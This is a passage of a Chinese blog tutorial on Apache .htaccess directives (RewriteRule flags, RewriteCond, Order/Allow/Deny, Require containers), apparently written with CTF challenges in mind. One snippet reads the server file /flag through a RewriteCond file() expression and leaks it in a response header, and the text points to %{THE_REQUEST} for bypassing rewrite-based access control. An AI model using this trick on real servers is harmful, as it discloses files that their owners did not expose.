+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule ^protected/ - [F]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p>[NC] —— No Case</p>
+<p><strong>大小写不敏感匹配</strong>。</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule ^admin.php$ - [F,NC]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>拦截 <code>admin.php</code>、<code>Admin.php</code>、<code>ADMIN.PHP</code>。</p>
+<p>[QSA] —— Query String Append</p>
+<p><strong>追加查询字符串</strong>，而不是替换。</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule ^page/(\d+)$ index.php?id=$1 [QSA]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p>[E] —— env</p>
+<p><code>[E]</code> 是 <code>RewriteRule</code> 的<strong>环境变量标志</strong>，用于在重写过程中<strong>设置或修改环境变量</strong>。它是 Apache 中传递数据的重要机制。</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule 模式 目标 [E=变量名:值]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>示例</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /(.+)/&quot;</span><br><span class="line">RewriteRule .* - [E=FLAG_CONTENT:%1]</span><br><span class="line">#匹配所有请求 不重写url 将不获取赋值给环境变量</span><br><span class="line">Header set X-Test-Expr &quot;%&#123;FLAG_CONTENT&#125;e&quot;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+
+
+<h4 id="3-RewriteCond重写的前置条件"><a href="#3-RewriteCond重写的前置条件" class="headerlink" title="3.RewriteCond重写的前置条件"></a>3.RewriteCond重写的前置条件</h4><p>语法</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteCond TestString Condition [flags]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p><strong>紧跟在它后面的第一条 RewriteRule</strong> 只有在<strong>所有 RewriteCond 都满足</strong>时才会执行。也就是说RewriteCond不会同时修饰多个RewriteRule，每一个RewriteRule都必须重新写一份RewriteCond</p>
+<p>然后多个RewriteCond修饰同一个RewriteRule的时候之间还是存在逻辑关系，这之间默认的关系是and。可以加上or。</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^/admin</span><br><span class="line">RewriteCond %&#123;REMOTE_ADDR&#125; !^192\.168\.1\.100$</span><br><span class="line">RewriteRule ^ - [F]</span><br><span class="line"></span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^/admin [OR]</span><br><span class="line">RewriteCond %&#123;QUERY_STRING&#125; debug=1</span><br><span class="line">RewriteRule ^log\.php$ - [F]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>需要注意一下RewriteCond和RewriteRule都可以通过正则表达式进行捕获拿到捕获组，但是表示的符号有区别，RewriteRule捕获组使用<code>$1,$2</code>表示，RewriteCond则是使用<code>%1,%2</code>表示。</p>
+<p>常用测试变量</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">变量</th>
+<th align="left">含义</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>%&#123;REQUEST_URI&#125;</code></td>
+<td align="left">请求的路径（不含域名）</td>
+<td align="left"><code>/article/123</code></td>
+</tr>
+<tr>
+<td align="left"><code>%&#123;QUERY_STRING&#125;</code></td>
+<td align="left">查询字符串</td>
+<td align="left"><code>id=1&amp;page=2</code></td>
+</tr>
+<tr>
+<td align="left"><code>%&#123;HTTP_HOST&#125;</code></td>
+<td align="left">域名</td>
+<td align="left"><code>example.com</code></td>
+</tr>
+<tr>
+<td align="left"><code>%&#123;REMOTE_ADDR&#125;</code></td>
+<td align="left">客户端 IP</td>
+<td align="left"><code>192.168.1.1</code></td>
+</tr>
+<tr>
+<td align="left"><code>%&#123;HTTP_USER_AGENT&#125;</code></td>
+<td align="left">浏览器 UA</td>
+<td align="left"><code>curl/7.68.0</code></td>
+</tr>
+<tr>
+<td align="left"><code>%&#123;REQUEST_METHOD&#125;</code></td>
+<td align="left">GET&#x2F;POST</td>
+<td align="left"><code>GET</code></td>
+</tr>
+<tr>
+<td align="left"><code>%&#123;THE_REQUEST&#125;</code></td>
+<td align="left"><strong>完整的原始请求行</strong></td>
+<td align="left"><code>GET /article/123 HTTP/1.1</code></td>
+</tr>
+</tbody></table></div>
+<p><strong><code>%&#123;THE_REQUEST&#125;</code> 的特殊性</strong>：<br>它包含<strong>完整的请求方法、路径、协议</strong>，而且<strong>不会被重写影响</strong>。<br>这是 CTF 里<strong>绕过基于重写的访问控制</strong>的核心。</p>
+<p>条件模式</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">操作符</th>
+<th align="left">含义</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>=</code></td>
+<td align="left">字符串相等</td>
+<td align="left"><code>RewriteCond %&#123;REQUEST_URI&#125; =/admin</code></td>
+</tr>
+<tr>
+<td align="left"><code>-f</code></td>
+<td align="left">是存在的文件</td>
+<td align="left"><code>RewriteCond %&#123;REQUEST_FILENAME&#125; -f</code></td>
+</tr>
+<tr>
+<td align="left"><code>-d</code></td>
+<td align="left">是存在的目录</td>
+<td align="left"><code>RewriteCond %&#123;REQUEST_FILENAME&#125; -d</code></td>
+</tr>
+<tr>
+<td align="left"><code>-s</code></td>
+<td align="left">文件存在且大小 &gt;0</td>
+<td align="left"><code>RewriteCond %&#123;REQUEST_FILENAME&#125; -s</code></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;</code>, <code>&gt;</code>, <code>&gt;=</code></td>
+<td align="left">数值比较</td>
+<td align="left"><code>RewriteCond %&#123;REMOTE_PORT&#125; &gt;1024</code></td>
+</tr>
+</tbody></table></div>
+<h3 id="2-Order-Allow-Deny访问控制"><a href="#2-Order-Allow-Deny访问控制" class="headerlink" title="2.Order, Allow, Deny访问控制"></a>2.Order, Allow, Deny访问控制</h3><p>虽然我们可以通过RewriteRule去捕获访问的url进行拦截和放行，但是那样写虽然细致，但是太麻烦了，Apache提供给我们可以直接用于访问控制的语句。</p>
+<p>这个属于老语法了，Apache2.2及以前默认使用，但是2.2之后使用需要加载<strong>mod_access_compat 模块。</strong></p>
+<p>Order用于决定Allow和Deny的执行顺序，Allow用于放行，Deny用于禁止</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Order Allow,Deny   # 先执行Allow，再执行Deny → Deny优先生效</span><br><span class="line">Order Deny,Allow   # 先执行Deny，再执行Allow → Allow优先生效</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<ul>
+<li><strong><code>Order Allow,Deny</code> &#x3D; “白名单模式”</strong>（最后看Deny，Deny优先级高）</li>
+<li><strong><code>Order Deny,Allow</code> &#x3D; “黑名单模式”</strong>（最后看Allow，Allow优先级高）</li>
+</ul>
+<p><strong>例1：仅允许192.168.1.100</strong></p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Order Deny,Allow</span><br><span class="line">Deny from all</span><br><span class="line">Allow from 192.168.1.100</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>顺序：先Deny（拒绝所有人）→ 再Allow（允许特定IP）→ <strong>Allow覆盖Deny</strong> ✅</p>
+<p><strong>例2：仅禁止10.0.0.5</strong></p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Order Allow,Deny</span><br><span class="line">Allow from all</span><br><span class="line">Deny from 10.0.0.5</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>顺序：先Allow（允许所有人）→ 再Deny（禁止特定IP）→ <strong>Deny覆盖Allow</strong> ✅</p>
+<h3 id="3-Require访问控制"><a href="#3-Require访问控制" class="headerlink" title="3.Require访问控制"></a>3.Require访问控制</h3><p><code>Require</code> 是 Apache 2.4+ <strong>现代访问控制体系的核心</strong>，取代了老旧的 <code>Order</code>、<code>Allow</code>、<code>Deny</code>。</p>
+<p>Require没有明确的意思，既可以放行也可以拦截，Require不能单独使用，而是作为一个标记，表示这是Require语句进行访问控制。</p>
+<p>简单语句</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Require all granted   # 允许所有访问</span><br><span class="line">Require all denied    # 拒绝所有访问</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>然后Require后面直接接条件的时候都是放行，然后多个Require语句并列相当于或的关系。</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Require ip 192.168.1.100      # 允许特定IP</span><br><span class="line">Require ip 10.0.0.0/24        # 允许整个网段</span><br><span class="line">Require host example.com      # 允许特定域名（反向DNS查询）</span><br><span class="line">Require user admin john       # 允许特定用户（需认证）</span><br><span class="line">Require group editors         # 允许特定组（需认证）</span><br><span class="line">Require method GET POST       # 允许特定HTTP方法</span><br><span class="line">Require expr &quot;%&#123;TIME_HOUR&#125; -ge 9 &amp;&amp; %&#123;TIME_HOUR&#125; -le 17&quot;  # 允许工作时间</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>禁止的话使用Require not语句，但是Require not语句不能单独使用。Apache 的语法设计要求：<strong>“否定”只能作为组合逻辑的一部分存在</strong>，不能作为顶级指令。于是禁止某个ip，在Require语句中表述必须为：<strong>其他ip都可以通过，但是这个ip不行</strong>。</p>
+<h4 id="1-Require容器"><a href="#1-Require容器" class="headerlink" title="1.Require容器"></a>1.Require容器</h4><p>为了实现放行和拦截操作，Require语句也需要逻辑，但是相较于Allow和Deny语句那抽象的执行顺序，Require给出了方便的Require容器用来编辑逻辑。</p>
+<p><strong>1.<code>&lt;RequireAll&gt;</code> —— 必须满足所有条件（AND）</strong></p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;RequireAll&gt;</span><br><span class="line">    Require ip 192.168.1.0/24</span><br><span class="line">    Require not ip 10.0.0.5</span><br><span class="line">    Require expr &quot;%&#123;TIME_WDAY&#125; != 0&quot;   # 不是周日</span><br><span class="line">&lt;/RequireAll&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>只有同时满足：内网IP + 不是10.0.0.5 + 不是周日 → 才允许。</p>
+<p><strong>2.<code>&lt;RequireAny&gt;</code> —— 满足任一条件即可（OR）</strong></p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;RequireAny&gt;</span><br><span class="line">    Require ip 192.168.1.100</span><br><span class="line">    Require ip 127.0.0.1</span><br><span class="line">    Require user admin</span><br><span class="line">&lt;/RequireAny&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>内网IP <strong>或</strong> 本机 <strong>或</strong> admin用户 → 允许。</p>
+<p><strong>3.<code>&lt;RequireNone&gt;</code> —— 不能满足任何条件（NOT）</strong></p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;RequireNone&gt;</span><br><span class="line">    Require ip 10.0.0.5</span><br><span class="line">    Require ip 192.168.1.200</span><br><span class="line">&lt;/RequireNone&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>只要不是这两个IP → 允许（等价于“排除这两个IP”）。</p>
+<p><strong>4.嵌套组合</strong></p>
+<p>Require容器当然可以进行嵌套</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;RequireAll&gt;</span><br><span class="line">    Require ip 192.168.1.0/24</span><br><span class="line">    &lt;RequireNone&gt;</span><br><span class="line">        Require ip 10.0.0.5</span><br><span class="line">        Require user guest</span><br><span class="line">    &lt;/RequireNone&gt;</span><br><span class="line">&lt;/RequireAll&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 